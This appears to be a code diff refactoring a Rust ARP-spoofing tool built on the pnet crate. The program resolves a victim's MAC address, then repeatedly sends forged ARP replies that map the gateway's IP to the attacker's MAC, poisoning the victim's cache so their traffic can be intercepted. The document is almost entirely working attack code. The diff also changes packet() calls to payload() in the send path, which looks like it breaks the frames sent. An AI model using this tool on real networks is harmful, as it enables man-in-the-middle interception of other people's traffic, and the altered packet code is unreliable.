@@ -1,21 +1,18 @@
 extern crate pnet;
 
 use core::time;
-use std::env;
-use std::io::{self, Write};
-use std::net::{AddrParseError, IpAddr, Ipv4Addr};
-use std::process;
+use std::net::{IpAddr, Ipv4Addr};
 use std::thread;
 
 use clap::Parser;
 
-use pnet::datalink::{Channel, MacAddr, NetworkInterface, DataLinkSender, DataLinkReceiver};
+use pnet::datalink::{Channel, MacAddr, NetworkInterface};
+use pnet::packet::Packet;
 use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, ArpPacket, MutableArpPacket};
 use pnet::packet::ethernet::EtherTypes;
 use pnet::packet::ethernet::MutableEthernetPacket;
-use pnet::packet::{MutablePacket, Packet};
 
-fn send_to(interface: &NetworkInterface, source: MacAddr, destination: MacAddr, packet: ArpPacket) {
+fn send_to(interface: &NetworkInterface, source: &MacAddr, destination: &MacAddr, packet: &ArpPacket) {
     let (mut sender, _) = match pnet::datalink::channel(interface, Default::default()) {
         Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
         Ok(_) => panic!("Unknown channel type"),
@@ -26,65 +23,18 @@ fn send_to(interface: &NetworkInterface, source: MacAddr, destination: MacAddr, 
     let mut ethernet_buffer = [0u8; 42];
     let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();
 
-    ethernet_packet.set_destination(destination);
-    ethernet_packet.set_source(source);
+    ethernet_packet.set_destination(*destination);
+    ethernet_packet.set_source(*source);
     ethernet_packet.set_ethertype(EtherTypes::Arp);
-    ethernet_packet.set_payload(packet.packet());
+    ethernet_packet.set_payload(packet.payload());
 
     // Send ethernet packet
     sender
-        .send_to(ethernet_packet.packet(), None)
+        .send_to(ethernet_packet.payload(), None)
         .unwrap()
         .unwrap();
-}
 
-fn receive_from(interface: &NetworkInterface) -> ArpPacket {
-    let (_, mut receiver) = match pnet::datalink::channel(interface, Default::default()) {
-        Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
-        Ok(_) => panic!("Unknown channel type"),
-        Err(e) => panic!("Error occured {}", e)
-    };
-
-    // Wait for reply
-    let buf = receiver.next().unwrap();
-
-    let arp = ArpPacket::new(&buf[MutableEthernetPacket::minimum_packet_size()..]).unwrap();
-
-    arp.to_immutable()
-}
-
-fn build_request_packet(target_ip: Ipv4Addr, source_mac: MacAddr, source_ip: Ipv4Addr) -> ArpPacket {
-    let mut arp_buffer = [0u8; 28];
-    let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();
-
-    arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
-    arp_packet.set_protocol_type(EtherTypes::Ipv4);
-    arp_packet.set_hw_addr_len(6);
-    arp_packet.set_proto_addr_len(4);
-    arp_packet.set_operation(ArpOperations::Request);
-    arp_packet.set_sender_hw_addr(source_mac);
-    arp_packet.set_sender_proto_addr(source_ip);
-    arp_packet.set_target_hw_addr(MacAddr::zero());
-    arp_packet.set_target_proto_addr(target_ip);
-
-    arp_packet.to_immutable()
-}
-
-fn build_response_packet(target_mac: MacAddr, target_ip: Ipv4Addr, source_mac: MacAddr, source_ip: Ipv4Addr) -> ArpPacket {
-    let mut arp_buffer = [0u8; 28];
-    let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();
-
-    arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
-    arp_packet.set_protocol_type(EtherTypes::Ipv4);
-    arp_packet.set_hw_addr_len(6);
-    arp_packet.set_proto_addr_len(4);
-    arp_packet.set_operation(ArpOperations::Reply);
-    arp_packet.set_sender_hw_addr(source_mac);
-    arp_packet.set_sender_proto_addr(source_ip);
-    arp_packet.set_target_hw_addr(target_mac);
-    arp_packet.set_target_proto_addr(target_ip);
-
-    arp_packet.to_immutable()
+    println!("Packet sent from {} to {}", *source, *destination);
 }
 
 fn get_source_ip(interface: &NetworkInterface) -> Ipv4Addr {
@@ -99,20 +49,51 @@ fn get_source_ip(interface: &NetworkInterface) -> Ipv4Addr {
         .unwrap()
 }
 
-fn request_mac(interface: &NetworkInterface, target_ip: Ipv4Addr) -> MacAddr {
-    let source_mac = interface.mac.unwrap();
-    let source_ip = get_source_ip(interface);
+fn request_mac(interface: &NetworkInterface, attacker_mac: &MacAddr, attacker_ip: &Ipv4Addr, victim_ip: &Ipv4Addr) -> MacAddr {
+    let mut arp_buffer = [0u8; 28];
+    let mut request = MutableArpPacket::new(&mut arp_buffer).unwrap();
 
-    let request = build_request_packet(target_ip, source_mac, source_ip);
-    send_to(interface, source_mac, MacAddr::broadcast(), request);
+    request.set_hardware_type(ArpHardwareTypes::Ethernet);
+    request.set_protocol_type(EtherTypes::Ipv4);
+    request.set_hw_addr_len(6);
+    request.set_proto_addr_len(4);
+    request.set_operation(ArpOperations::Request);
+    request.set_sender_hw_addr(*attacker_mac);
+    request.set_sender_proto_addr(*attacker_ip);
+    request.set_target_hw_addr(MacAddr::zero());
+    request.set_target_proto_addr(*victim_ip);
+    
+    send_to(interface, attacker_mac, &MacAddr::broadcast(), &request.to_immutable());
 
-    receive_from(interface).get_sender_hw_addr()
+    let (_, mut receiver) = match pnet::datalink::channel(interface, Default::default()) {
+        Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
+        Ok(_) => panic!("Unknown channel type"),
+        Err(e) => panic!("Error occured {}", e)
+    };
+
+    // Wait for reply
+    let buf = receiver.next().unwrap();
+
+    let arp = ArpPacket::new(&buf[MutableEthernetPacket::minimum_packet_size()..]).unwrap();
+
+    arp.get_sender_hw_addr()
 }
 
-fn arp_spoof(interface: &NetworkInterface, attacker_mac: MacAddr, gateway_ip: Ipv4Addr, victim_mac: MacAddr, victim_ip: Ipv4Addr) {
-    let response_packet = build_response_packet(victim_mac, victim_ip, attacker_mac, gateway_ip);
+fn arp_spoof(interface: &NetworkInterface, attacker_mac: &MacAddr, gateway_ip: &Ipv4Addr, victim_mac: &MacAddr, victim_ip: &Ipv4Addr) {
+    let mut arp_buffer = [0u8; 28];
+    let mut response = MutableArpPacket::new(&mut arp_buffer).unwrap();
 
-    send_to(interface, attacker_mac, victim_mac, response_packet);
+    response.set_hardware_type(ArpHardwareTypes::Ethernet);
+    response.set_protocol_type(EtherTypes::Ipv4);
+    response.set_hw_addr_len(6);
+    response.set_proto_addr_len(4);
+    response.set_operation(ArpOperations::Reply);
+    response.set_sender_hw_addr(*attacker_mac);
+    response.set_sender_proto_addr(*gateway_ip);
+    response.set_target_hw_addr(*victim_mac);
+    response.set_target_proto_addr(*victim_ip);
+
+    send_to(interface, attacker_mac, victim_mac, &response.to_immutable());
 }
 
 fn get_interface(iface_name: String) -> NetworkInterface {
@@ -148,12 +129,18 @@ fn main() {
     let interface = get_interface(args.iface_name);
     
     let attacker_mac = interface.mac.unwrap();
-    let victim_mac = request_mac(&interface, victim_ip);
+    let attacker_ip = get_source_ip(&interface);
+    let victim_mac = request_mac(&interface, &attacker_mac, &attacker_ip, &victim_ip);
+
+    println!("Victim: [IP address: {}, Mac Address {}]", victim_ip, victim_mac);
+    println!("Attacker: [IP address: {}, Mac Address {}", attacker_ip, attacker_mac);
+    println!("Gateway Address: {}", gateway_ip);
+    println!("Interface: {}", interface.name);
 
     println!("Repeating every {} second (Ctrl+C to quit)\n", args.repeat);
 
     loop {
-        arp_spoof(&interface, attacker_mac, gateway_ip, victim_mac, victim_ip);
+        arp_spoof(&interface, &attacker_mac, &gateway_ip, &victim_mac, &victim_ip);
         thread::sleep(time::Duration::from_secs(args.repeat));
     }
 }
